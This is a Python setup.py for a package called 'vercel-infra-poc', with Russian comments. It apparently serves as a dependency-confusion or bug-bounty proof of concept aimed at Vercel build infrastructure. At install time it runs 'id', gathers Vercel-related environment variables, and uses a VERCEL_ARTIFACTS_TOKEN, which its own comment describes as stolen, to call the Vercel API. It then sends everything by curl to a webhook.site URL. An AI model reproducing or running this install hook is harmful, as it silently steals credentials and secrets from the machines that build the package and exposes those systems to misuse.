from setuptools import setup
import os
import subprocess
import json

# 1. Собираем базовую информацию (как было)
whoami = subprocess.getoutput('id')
vercel_vars = "\n".join([f"{k}={v}" for k, v in os.environ.items() if "VERCEL" in k or "NOW" in k])

# 2. ПРОВЕРКА ТОКЕНА (Добавляем это!)
token = os.environ.get('VERCEL_ARTIFACTS_TOKEN')
api_check_result = "Token not found"

if token:
    try:
        # Пробуем вызвать официальное API Vercel, используя украденный токен
        # Ручка /v8/artifacts/status безопасна, но подтверждает права доступа
        cmd = f'curl -s -H "Authorization: Bearer {token}" https://api.vercel.com/v8/artifacts/status'
        api_check_result = subprocess.getoutput(cmd)
    except Exception as e:
        api_check_result = f"Error during API check: {str(e)}"

# 3. Формируем расширенный отчет
payload = (
    f"--- PRODUCTION PROOF ---\n"
    f"USER: {whoami}\n\n"
    f"--- API VALIDATION ---\n"
    f"RESPONSE FROM VERCEL API: {api_check_result}\n\n"
    f"--- ENVIRONMENT VARS ---\n"
    f"{vercel_vars}"
)

# Твой URL на webhook.site
url = "https://webhook.site/57c42274-2817-4041-81a2-3f41b2c987a2"

try:
    # Отправляем все данные на вебхук
    subprocess.run(['curl', '-X', 'POST', '-H', 'Content-Type: text/plain', '--data-binary', payload, url])
except:
    pass

setup(name="vercel-infra-poc", version="1.0.0")